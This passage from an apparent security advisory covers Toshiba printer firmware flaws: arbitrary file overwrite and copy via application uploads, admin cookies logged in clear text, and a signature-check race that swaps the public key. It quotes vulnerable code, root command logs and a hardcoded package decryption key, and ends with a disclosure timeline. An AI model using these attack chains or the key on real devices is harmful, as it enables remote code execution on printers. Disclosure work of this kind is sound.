-rwxr-xr-x  1 root   root          0 Oct 27 02:15 m.disableLogs.4
[...]
-rw-rw-rw-  1 apache trusted       3 Oct 27 12:15 b'upload-2.txt'
drwxrwxr-x  2 root   root       7840 Oct 27 12:15 .
</code></pre>
<p>An attacker can overwrite files as apache (e.g. Python files) to get Remote Code Execution.</p>
<p>An attacker can get Remote Code Execution by creating and/or overwriting files (mainly crontab files due to the restriction on the filename).</p>
<p><a id="rce-insecure-upload-04"></a></p>
<h2>Details - Remote Code Execution - insecure upload</h2>
<p>It is possible to overwrite any file when installing a new application in Administration &gt; Application &gt; Application List &gt; Install Application:</p>
<p>When installing an application, several requests will be sent to the printer:</p>
<ol>
<li>the first request is a HTTP POST to <code>/tapy/server/appmgmt/uploadPackage</code>,</li>
<li>then a HTTP POST is sent to <code>/tapy/server/appmgmt/extractPackage</code>.</li>
</ol>
<p>This vulnerability is similar to the previous vulnerability but it requires exploiting another variable. As shown previously, the attacker has full control over:</p>
<ul>
<li><code>packagename</code> defined in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py:188</code> from the POST-data <code>txtSelectedFileName</code> variable.</li>
</ul>
<p>The <code>packagename</code> variable is not filtered and can contain any value, and can be used to write file anywhere in the filesystem. This variable is ultimately used in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code> on line 480 to generate the filename:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">464</span>     <span style="color: #AA22FF">@classmethod</span>
<span style="color: #666666">465</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_package</span>(<span style="color: #008000">cls</span>, packagename, package_file, SessionID):
<span style="color: #666666">466</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_package start&quot;</span>)
<span style="color: #666666">467</span>
<span style="color: #666666">468</span>         upload_destination <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/work/al/tmp/upload/&#39;</span> <span style="color: #666666">+</span> SessionID <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/&#39;</span>
<span style="color: #666666">469</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #AA22FF; font-weight: bold">not</span> os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>exists(upload_destination):
<span style="color: #666666">470</span>             os<span style="color: #666666">.</span>makedirs(upload_destination)
<span style="color: #666666">471</span>
<span style="color: #666666">472</span>         <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">473</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start&quot;</span>)
<span style="color: #666666">474</span>             <span style="color: #408080; font-style: italic">#if type(packagename) == str:</span>
<span style="color: #666666">475</span>             <span style="color: #408080; font-style: italic">#packagename = unicode(packagename, &quot;utf-8&quot;, errors=&quot;ignore&quot;)</span>
<span style="color: #666666">476</span>             <span style="color: #408080; font-style: italic">#else:</span>
<span style="color: #666666">477</span>                 <span style="color: #408080; font-style: italic">#packagename = unicode(packagename)</span>
<span style="color: #666666">478</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start -- test end&quot;</span>)
<span style="color: #666666">479</span>             <span style="color: #408080; font-style: italic">#absolute_package_path = os.path.join(upload_destination , packagename).encode()</span>
<span style="color: #666666">480</span>             absolute_package_path <span style="color: #666666">=</span> <span style="color: #008000">str</span>(os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>join(upload_destination , <span style="color: #008000">str</span>(packagename<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;ascii&#39;</span>,<span style="color: #BA2121">&#39;ignore&#39;</span>))))
<span style="color: #666666">481</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(absolute_package_path, <span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> output_file:
<span style="color: #666666">482</span>                 shutil<span style="color: #666666">.</span>copyfileobj(package_file, output_file)
<span style="color: #666666">483</span>
<span style="color: #666666">484</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;SUCCESS&quot;</span>
<span style="color: #666666">485</span>
<span style="color: #666666">486</span>         <span style="color: #008000; font-weight: bold">except</span> <span style="color: #D2413A; font-weight: bold">Exception</span> <span style="color: #008000; font-weight: bold">as</span> err:
<span style="color: #666666">487</span>             log<span style="color: #666666">.</span>exception(<span style="color: #BA2121">&quot;Error In exitApp(upload_file) : &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(err))
<span style="color: #666666">488</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;FAILURE&quot;</span>
</pre></div>

<p>An attacker can overwrite files as apache (e.g. Python files) to get Remote Code Execution.</p>
<p>An attacker can get Remote Code Execution by creating and/or overwriting files (mainly crontab files due to the restriction on the filename).</p>
<p><a id="rce-insecure-copy"></a></p>
<h2>Details - Remote Code Execution - insecure copy</h2>
<p>It is possible to overwrite any file when installing a new application in Administration &gt; Application &gt; Application List &gt; Install Application:</p>
<p>When installing an application, several requests will be sent to the printer:</p>
<ol>
<li>the first request is a HTTP POST to <code>/tapy/server/appmgmt/uploadPackage</code>,</li>
<li>then a HTTP POST is sent to <code>/tapy/server/appmgmt/extractPackage</code>.</li>
</ol>
<p>This vulnerability is similar to the previous vulnerability but it requires exploiting another variable. As shown previously, the attacker has full control over:</p>
<ul>
<li><code>package_file</code> defined in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py:189</code> from the POST-data <code>idFileName</code> variable.</li>
</ul>
<p>The <code>package_file</code> variable is not filtered and can contain any value, and can be used to copy file anywhere in the filesystem. This variable is ultimately used in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code> on line 482 to copy any local file to a specific filename:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">464</span>     <span style="color: #AA22FF">@classmethod</span>
<span style="color: #666666">465</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_package</span>(<span style="color: #008000">cls</span>, packagename, package_file, SessionID):
<span style="color: #666666">466</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: upload_package start&quot;</span>)
<span style="color: #666666">467</span>
<span style="color: #666666">468</span>         upload_destination <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/work/al/tmp/upload/&#39;</span> <span style="color: #666666">+</span> SessionID <span style="color: #666666">+</span> <span style="color: #BA2121">&#39;/&#39;</span>
<span style="color: #666666">469</span>         <span style="color: #008000; font-weight: bold">if</span> <span style="color: #AA22FF; font-weight: bold">not</span> os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>exists(upload_destination):
<span style="color: #666666">470</span>             os<span style="color: #666666">.</span>makedirs(upload_destination)
<span style="color: #666666">471</span>
<span style="color: #666666">472</span>         <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">473</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start&quot;</span>)
<span style="color: #666666">474</span>             <span style="color: #408080; font-style: italic">#if type(packagename) == str:</span>
<span style="color: #666666">475</span>             <span style="color: #408080; font-style: italic">#packagename = unicode(packagename, &quot;utf-8&quot;, errors=&quot;ignore&quot;)</span>
<span style="color: #666666">476</span>             <span style="color: #408080; font-style: italic">#else:</span>
<span style="color: #666666">477</span>                 <span style="color: #408080; font-style: italic">#packagename = unicode(packagename)</span>
<span style="color: #666666">478</span>             log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;  upload_package start -- test end&quot;</span>)
<span style="color: #666666">479</span>             <span style="color: #408080; font-style: italic">#absolute_package_path = os.path.join(upload_destination , packagename).encode()</span>
<span style="color: #666666">480</span>             absolute_package_path <span style="color: #666666">=</span> <span style="color: #008000">str</span>(os<span style="color: #666666">.</span>path<span style="color: #666666">.</span>join(upload_destination , <span style="color: #008000">str</span>(packagename<span style="color: #666666">.</span>encode(<span style="color: #BA2121">&#39;ascii&#39;</span>,<span style="color: #BA2121">&#39;ignore&#39;</span>))))
<span style="color: #666666">481</span>             <span style="color: #008000; font-weight: bold">with</span> <span style="color: #008000">open</span>(absolute_package_path, <span style="color: #BA2121">&#39;wb&#39;</span>) <span style="color: #008000; font-weight: bold">as</span> output_file:
<span style="color: #666666">482</span>                 shutil<span style="color: #666666">.</span>copyfileobj(package_file, output_file)
<span style="color: #666666">483</span>
<span style="color: #666666">484</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;SUCCESS&quot;</span>
<span style="color: #666666">485</span>
<span style="color: #666666">486</span>         <span style="color: #008000; font-weight: bold">except</span> <span style="color: #D2413A; font-weight: bold">Exception</span> <span style="color: #008000; font-weight: bold">as</span> err:
<span style="color: #666666">487</span>             log<span style="color: #666666">.</span>exception(<span style="color: #BA2121">&quot;Error In exitApp(upload_file) : &quot;</span> <span style="color: #666666">+</span> <span style="color: #008000">str</span>(err))
<span style="color: #666666">488</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #BA2121">&quot;FAILURE&quot;</span>
</pre></div>

<p>An attacker can copy and overwrite files as apache (e.g. Python files) to get Remote Code Execution.</p>
<p>An attacker can get Remote Code Execution by creating and/or overwriting files (mainly crontab files due to the restriction on the filename).</p>
<p><a id="session-disclosure-logs"></a></p>
<h2>Details - Session disclosure inside the log files in the installation of applications</h2>
<p>During the installation of applications, cookies are written in clear-text in logs.</p>
<p>When installing an application, several requests will be sent and the method <code>validate_user()</code> will be called: this method will write admin cookies in clear-text in the logs.</p>
<p>In the <code>upload_package</code> method, the <code>validate_user()</code> is called to check the authorization on line 191 in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code>:</p>
<p>Content of <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/views.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">170</span> <span style="color: #AA22FF">@view_config</span>(route_name<span style="color: #666666">=</span><span style="color: #BA2121">&#39;upload_package&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">False</span>, renderer<span style="color: #666666">=</span><span style="color: #BA2121">&#39;string&#39;</span>)
<span style="color: #666666">171</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">upload_package</span>(request):
<span style="color: #666666">172</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;++++++++++++++++++++++++++++++++&quot;</span>)
<span style="color: #666666">173</span>     log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;upload_package : Start &quot;</span>)
<span style="color: #666666">174</span>     SessionID <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">175</span>     session <span style="color: #666666">=</span> <span style="color: #BA2121">&#39; &#39;</span>
<span style="color: #666666">176</span>     csrfpId <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&#39;</span>
<span style="color: #666666">177</span>
<span style="color: #666666">178</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;SessionID&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">179</span>         SessionID <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;SessionID&#39;</span>] <span style="color: #666666">&lt;----</span> SessionID <span style="color: #AA22FF; font-weight: bold">is</span> retrieved <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">cookie</span>
<span style="color: #666666">180</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;Session&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>cookies:
<span style="color: #666666">181</span>         session <span style="color: #666666">=</span> request<span style="color: #666666">.</span>cookies[<span style="color: #BA2121">&#39;Session&#39;</span>] <span style="color: #666666">&lt;--------</span> Session <span style="color: #AA22FF; font-weight: bold">is</span> retrieved <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">the</span> <span style="color: #0000FF; font-weight: bold">cookie</span>
<span style="color: #666666">182</span>     <span style="color: #008000; font-weight: bold">if</span> <span style="color: #BA2121">&#39;txtCSRFPID&#39;</span> <span style="color: #AA22FF; font-weight: bold">in</span> request<span style="color: #666666">.</span>POST:
<span style="color: #666666">183</span>         csrfpId <span style="color: #666666">=</span> request<span style="color: #666666">.</span>POST[<span style="color: #BA2121">&#39;txtCSRFPID&#39;</span>]
<span style="color: #666666">184</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">191</span>     validationMap <span style="color: #666666">=</span> applicationManagementModel<span style="color: #666666">.</span>validate_user(SessionID, session, csrfpId)
</pre></div>

<p>During the execution flow, on line 191, the method <code>validate_user()</code> is called with the <code>SessionID</code> and the <code>Session</code> cookies.</p>
<p>These cookies are then written in clear-text in the logs on lines 391 and 392 in <code>/registration/al/TopAccessPy/server/screenfacade/appmgmt/applicationmanager.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">388</span>     <span style="color: #AA22FF">@classmethod</span>
 <span style="color: #666666">389</span>     <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">validate_user</span>(<span style="color: #008000">cls</span>, sessionId, session, csrfpid):
 <span style="color: #666666">390</span>         log<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;applicationManagementModel: validate_user start&quot;</span>)
 <span style="color: #666666">391</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;Session ID recieved   : &quot;</span> <span style="color: #666666">+</span> sessionId)
 <span style="color: #666666">392</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;CSRFPID  Recieved    : &quot;</span> <span style="color: #666666">+</span> csrfpid)
 <span style="color: #666666">393</span>         log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;Session     : &quot;</span> <span style="color: #666666">+</span> session)
 <span style="color: #666666">394</span>
</pre></div>

<p>Admin cookies are written in clear-text in logs.</p>
<p>An attacker can retrieve them and bypass the authentication mechanism.</p>
<p><a id="toctou-rce"></a></p>
<h2>Details - TOCTOU vulnerability in the installation of applications, allowing to install rogue applications and get RCE</h2>
<p>When installing an application through the web application (Administration &gt; Application &gt; Application List &gt; Install Application), a signature is checked inside the printer to proceed the installation of the uploaded application.</p>
<p>There is a chain of trust and the installation process is entirely based on the validity of the chain of trust.</p>
<p>Through dynamic analysis using a root shell during the installation process, we can see several commands being executed:</p>
<pre>
2023/10/27 10:54:31 CMD: UID=0     PID=32195  | sh -c if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi  
2023/10/27 10:54:31 CMD: UID=0     PID=32194  | watch -n 3 -t if [ -e /root/sshd_start.sh ]; then dos2unix /root/sshd_start.sh && chmod +x /root/sshd_start.sh && /root/sshd_start.sh && rm /root/sshd_start.sh || rm /root/sshd_start.sh; fi  
<font color=red>2023/10/27 10:54:33 CMD: UID=0     PID=32196  | sh -c echo "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2MWVi+kjfL/9lyuBls9O
NU5+qgiWNSzGgGqUq+Z9uaiWGoz6wOBKlQc55f3nUs6CfpX/e8cHgS8nySWWvgy8
LnK4f6XAUMRQC03jmHXfhbvJOd6PbkljFM/k19AwOf/xkTUVm45Tp5P3T1Bd9XWS
qUJxobgTS15c++IcsAAScD8cLZPRywLWRBoA0poms6uPVkyN9Oc3J2EMpZT/6XQW
ucNFh/ejLe1z0Pt/Sk4TeN/ELZ3+IHwBRfApelixcEoZTWtVbnvaUqO0mZ8PebTT
m6PlKE9fGiAe1FAQZE3fE7StyOIwxd+n3t5M+SdGba4ZJWJMskBaR8bTYHHe4DRp
PQIDAQAB
-----END PUBLIC KEY-----"> /work/ci/tmp/MFPAPI_public.key
2023/10/27 10:54:33 CMD: UID=0     PID=32197  | sh -c openssl rsautl -verify -pubin -inkey /work/ci/tmp/MFPAPI_public.key -in /work/al/tmp/package/Signature.enc -out /work/ci/SignatureFile_Dec</font>
2023/10/27 10:54:33 CMD: UID=0     PID=32198  | sh -c openssl enc -d -aes256 -md md5 -in /work/al/tmp/package/ApplicationPackage.enc -out /work/al/tmp/package/ApplicationPackage.zip -k 4f2594ffaa79c3a58e5a4868910f27f1 
</pre>

<p>If an invalid <code>Signature.enc</code> file is provided inside the uploaded application Package.zip file, then the process stops.</p>
<p>The command (PID=32196 in the dynamic analysis) that writes the public key into a file is hardcoded inside <code>/home/SYSROM_SRC/build/release/lib/libcipltintegritycheck.so.0</code>.</p>
<p>Content of <code>/home/SYSROM_SRC/build/release/lib/libcipltintegritycheck.so.0</code>:</p>
<pre><code>.rodata:00016620 aEchoBeginPubli db 'echo "-----BEGIN PUBLIC KEY-----',0Ah
.rodata:00016620                 db 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2MWVi+kjfL/9lyuBls9O',0Ah
.rodata:00016620                 db 'NU5+qgiWNSzGgGqUq+Z9uaiWGoz6wOBKlQc55f3nUs6CfpX/e8cHgS8nySWWvgy8',0Ah
.rodata:00016620                 db 'LnK4f6XAUMRQC03jmHXfhbvJOd6PbkljFM/k19AwOf/xkTUVm45Tp5P3T1Bd9XWS',0Ah
.rodata:00016620                 db 'qUJxobgTS15c++IcsAAScD8cLZPRywLWRBoA0poms6uPVkyN9Oc3J2EMpZT/6XQW',0Ah
.rodata:00016620                 db 'ucNFh/ejLe1z0Pt/Sk4TeN/ELZ3+IHwBRfApelixcEoZTWtVbnvaUqO0mZ8PebTT',0Ah
.rodata:00016620                 db 'm6PlKE9fGiAe1FAQZE3fE7StyOIwxd+n3t5M+SdGba4ZJWJMskBaR8bTYHHe4DRp',0Ah
.rodata:00016620                 db 'PQIDAQAB',0Ah
.rodata:00016620                 db '-----END PUBLIC KEY-----"&gt; /work/ci/tmp/MFPAPI_public.key',0
.rodata:0001680A                 align 20h
</code></pre>
<p>The verification using the public key is secure in theory. The size of the RSA key is 2048 bits, so it is unlikely to be factorized by threat actors:</p>
<pre><code>kali% openssl rsa -inform PEM -pubin -in MFPAPI_public.key -text -noout
Public-Key: (2048 bit)
Modulus:
    00:d8:c5:95:8b:e9:23:7c:bf:fd:97:2b:81:96:cf:
    4e:35:4e:7e:aa:08:96:35:2c:c6:80:6a:94:ab:e6:
    7d:b9:a8:96:1a:8c:fa:c0:e0:4a:95:07:39:e5:fd:
    e7:52:ce:82:7e:95:ff:7b:c7:07:81:2f:27:c9:25:
    96:be:0c:bc:2e:72:b8:7f:a5:c0:50:c4:50:0b:4d:
    e3:98:75:df:85:bb:c9:39:de:8f:6e:49:63:14:cf:
    e4:d7:d0:30:39:ff:f1:91:35:15:9b:8e:53:a7:93:
    f7:4f:50:5d:f5:75:92:a9:42:71:a1:b8:13:4b:5e:
    5c:fb:e2:1c:b0:00:12:70:3f:1c:2d:93:d1:cb:02:
    d6:44:1a:00:d2:9a:26:b3:ab:8f:56:4c:8d:f4:e7:
    37:27:61:0c:a5:94:ff:e9:74:16:b9:c3:45:87:f7:
    a3:2d:ed:73:d0:fb:7f:4a:4e:13:78:df:c4:2d:9d:
    fe:20:7c:01:45:f0:29:7a:58:b1:70:4a:19:4d:6b:
    55:6e:7b:da:52:a3:b4:99:9f:0f:79:b4:d3:9b:a3:
    e5:28:4f:5f:1a:20:1e:d4:50:10:64:4d:df:13:b4:
    ad:c8:e2:30:c5:df:a7:de:de:4c:f9:27:46:6d:ae:
    19:25:62:4c:b2:40:5a:47:c6:d3:60:71:de:e0:34:
    69:3d
Exponent: 65537 (0x10001)
</code></pre>
<p>The entire chain of trust is based on a public key hardcoded inside the <code>/home/SYSROM_SRC/build/release/lib/libcipltintegritycheck.so.0</code> file, whose corresponding private key is used to generate the packages.</p>
<p>Unfortunately, when doing dynamic analysis, we can see that the public key used to verify the <code>Signature.enc</code> file is stored in an insecure manner in <code>/work/ci/tmp/MFPAPI_public.key</code>.</p>
<p>The <code>/work/ci/tmp/</code> directory is 777, allowing any attacker to write any file:</p>
<pre><code>bash-4.1# ls -la /work/ci/tmp/
total 16
drwxrwxrwx 2 root root    12288 Oct 27 11:26 .
drwxrwxrwx 6 root root     4096 Oct 27 11:26 ..
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_00000#boxproperties_dom.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_HDBROOT#GetCmdDoc.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_HDBROOT#RestrictionModeDeviceFaxEvent.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_HDBROOT#RestrictionModeDeviceState.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_HDBROOT#RestrictionModeSystemInformation.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 03:17 HDB_HDBROOT#RestrictionPowerSaveCommandToDSM.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_HDBROOT#RestrictionSecretReceptionFalseToDSM.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 06:17 HDB_HDBROOT#RestrictionSleepCommandToDSM.txt
-rwxrwxrwx 1 root trusted     0 Oct 27 02:16 HDB_Precompiled#Resources?Frames?COMMON?ALERTS?alertspanel_devicestatus.xml.txt
[...]
</code></pre>
<p>Furthermore, the resulting file <code>/work/ci/tmp/MFPAPI_public.key</code> is using insecure permissions (666) allowing any attacker to replace it with a rogue public key during the verification process using a file overwrite vulnerability.</p>
<p>This is a TOCTOU vulnerability:</p>
<pre><code>bash-4.1# for i in $(seq 1 100); do ls -la /work/ci/tmp/MFPAPI_public.key;sleep 0.1;done
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
-rw-rw-rw- 1 root trusted 451 Oct 27 11:26 /work/ci/tmp/MFPAPI_public.key
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
ls: cannot access /work/ci/tmp/MFPAPI_public.key: No such file or directory
[...]
</code></pre>
<p>An attacker can replace the <code>/work/ci/tmp/MFPAPI_public.key</code> file between the time when is it written into the printer and when it is being used by openssl:</p>
<pre><code>2023/10/27 10:54:33 CMD: UID=0     PID=32196  | sh -c echo "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2MWVi+kjfL/9lyuBls9O
NU5+qgiWNSzGgGqUq+Z9uaiWGoz6wOBKlQc55f3nUs6CfpX/e8cHgS8nySWWvgy8
LnK4f6XAUMRQC03jmHXfhbvJOd6PbkljFM/k19AwOf/xkTUVm45Tp5P3T1Bd9XWS
qUJxobgTS15c++IcsAAScD8cLZPRywLWRBoA0poms6uPVkyN9Oc3J2EMpZT/6XQW
ucNFh/ejLe1z0Pt/Sk4TeN/ELZ3+IHwBRfApelixcEoZTWtVbnvaUqO0mZ8PebTT
m6PlKE9fGiAe1FAQZE3fE7StyOIwxd+n3t5M+SdGba4ZJWJMskBaR8bTYHHe4DRp
PQIDAQAB
-----END PUBLIC KEY-----"&gt; /work/ci/tmp/MFPAPI_public.key
/\
|
------------- TOCTOU HERE --------------------
|
V
2023/10/27 10:54:33 CMD: UID=0     PID=32197  | sh -c openssl rsautl -verify -pubin -inkey /work/ci/tmp/MFPAPI_public.key -in /work/al/tmp/package/Signature.enc -out /work/ci/SignatureFile_Dec
</code></pre>
<p>There is a second TOCTOU between the following openssl commands. The second command is only executed if the <code>Signature.enc</code> is correctly verified in the first command and the password in the second command seems to depend on the content of the <code>Signature.enc</code> file. </p>
<p>Between the 2 openssl commands, an attacker can replace <code>/work/al/tmp/package/ApplicationPackage.enc</code> with a malicious package (encrypted with the password used by a trusted package).</p>
<pre><code>24     2023/10/27 10:54:33 CMD: UID=0     PID=32197  | sh -c openssl rsautl -verify -pubin -inkey /work/ci/tmp/MFPAPI_public.key -in /work/al/tmp/package/Signature.enc -out /work/ci/SignatureFile_Dec
/\
|
------------- TOCTOU HERE --------------------
|
V
25     2023/10/27 10:54:33 CMD: UID=0     PID=32198  | sh -c openssl enc -d -aes256 -md md5 -in /work/al/tmp/package/ApplicationPackage.enc -out /work/al/tmp/package/ApplicationPackage.zip -k 4f2594ffaa79c3a58e5a4868910f27f1
</code></pre>
<p>It is possible to install a rogue application package, signed with a rogue private key and at the same time to upload a file replacing the Toshiba original public key at <code>/work/ci/tmp/MFPAPI_public.key</code> with the corresponding rogue public key, breaking the entire chain of trust.</p>
<p>This rogue public key will then be used to verify the application (and it will pass): the application will be installed.</p>
<p>Consequently, an attacker can forge a rogue <code>/work/ci/tmp/MFPAPI_public.key</code> key and use its own public/private keys to install package file.</p>
<p>An attacker can also replace <code>/home/SYSROM_SRC/build/release/lib/libcipltintegritycheck.so.0</code> with a modified library since the permissions are insecure allowing to (i) get Remote Code Execution when the code is executed and/or (ii) contain a malicious public key and also get RCE.</p>
<p>An attacker with admin access can install rogue applications and get Remote Code Execution.</p>
<h2>Vendor Response</h2>
<p>JPCERT provided a <a href="https://jvn.jp/en/vu/JVNVU97136265/index.html">security bulletin</a>.</p>
<p>Toshiba provided a <a href="https://www.toshibatec.com/information/20240531_01.html">security bulletin</a>.</p>
<p><a id="timeline"></a></p>
<h2>Report Timeline</h2>
<ul>
<li>Mar - May 2023: Security assessment performed on Toshiba Multi-function printers (a total of 15 working days have been allocated for this security assessment).</li>
<li>Jun 14, 2023: A complete report was sent to Toshiba.</li>
<li>Jun 15, 2023: Tosbiba acknowledged the reception of the security assessment.</li>
<li>Jun 28, 2023: Tosbiba confirmed that the evaluation is in progress and provided new security contacts.</li>
<li>Jun 29, 2023: I asked the GPG keys of the new security contacts.</li>
<li>Jul 4, 2023: Toshiba provided new GPG keys and confirmed they were able to reproduce allmost all of the issues.</li>
<li>Jul 4, 2023: I asked when the security patches would be provided.</li>
<li>Jul 7, 2023: Toshiba confirmed that the vulnerabilities affect some models and the evaluation is still in progress. Toshiba asked details about the security assessment.</li>
<li>Jul 10, 2023: Additional details about the security assessment were provided.</li>
<li>Jul 11, 2023: Toshiba provided an Excel file listing the vulnerabilities with their evaluation.</li>
<li>Jul 12, 2023: Comments were provided to Toshiba regarding the evaluation of the vulnerabilities.</li>
<li>Jul 13, 2023: Toshiba provided further details regarding the evaluation of the vulnerabilities.</li>
<li>Jul 14, 2023: Comments were provided to Toshiba regarding the threat model and the necessity to patch root causes of vulnerabilities.</li>
<li>Jul 17, 2023: An updated Excel file with my additional comments was provided to Toshiba.</li>
<li>Jul 18, 2023: Toshiba confirmed the reception of the Excel file and confirmed they would review the issues by prioritizing critical vulnerabilities and would organize a meeting.</li>
<li>Jul 19, 2023: I confirmed that the meeting could be organized after the Excel file was reviewed.</li>
<li>Jul 21, 2023: Toshiba provided a work-in-progress Excel file with updated evaluations.</li>
<li>Jul 25, 2023: I confirmed the reception of the Excel file.</li>
<li>Jul 27, 2023: Toshiba confirmed that the new security evaluation was still in progress and asked feedback regarding the work-in-progress document listing measures.</li>
<li>Jul 28, 2023: I confirmed that I would provide comments about the work-in-progress document.</li>
<li>Aug 1, 2023: The Excel file was reviewed and an updated version was sent to Toshiba, confirming that the current Toshiba's analysis was very efficient (root causes of vulnerabilities would be patched).</li>
<li>Aug 1, 2023: Toshiba confirmed the reception of the document.</li>
<li>Aug 4, 2023: Toshiba sent the final version of the Excel document listing the vulnerabilities and the security patches.</li>
<li>Aug 4, 2023: I confirmed the reception of the document.</li>
<li>Aug 7, 2023: The Excel file listing the vulnerabilities, evaluations and remediations was updated with my comments and shared with Toshiba.</li>
<li>Aug 9, 2023: Virtual meeting with Toshiba - discussions about the vulnerabilities and the timeline to get security patches.</li>
<li>Aug 10, 2023: Additional details were provided to Toshiba regarding new potential vulnerabilities in an interesting attack surface that had not been analyzed.</li>
<li>Sep 5, 2023: Toshiba provided access to a firmware image of a third-party application.</li>
<li>Oct 24, 2023: Toshiba provided a list of CVE identifiers regarding the previously reported vulnerabilities.</li>
<li>Oct 25, 2023: Emails regarding the CVE identifiers.</li>
<li>Oct 26, 2023: Emails regarding the CVE identifiers.</li>
<li>Oct 27, 2023: 5 new 0-day vulnerabilities shared with Toshiba, after the analysis of the firmware image of a third-party application.</li>
<li>Oct 30, 2023: Toshiba confirmed that the analysis of the new vulnerabilities would be done as soon as possible.</li>
<li>Nov 11, 2023: Toshiba confirmed that the analysis of the new vulnerabilities was in-progress.</li>
<li>Nov 20, 2023: Emails regarding the CVSSv3 scores of the vulnerabilities.</li>
<li>Nov 21, 2023: Toshiba confirmed that they would review the scores.</li>
<li>Nov 21, 2023: Emails regarding CVE IDs.</li>
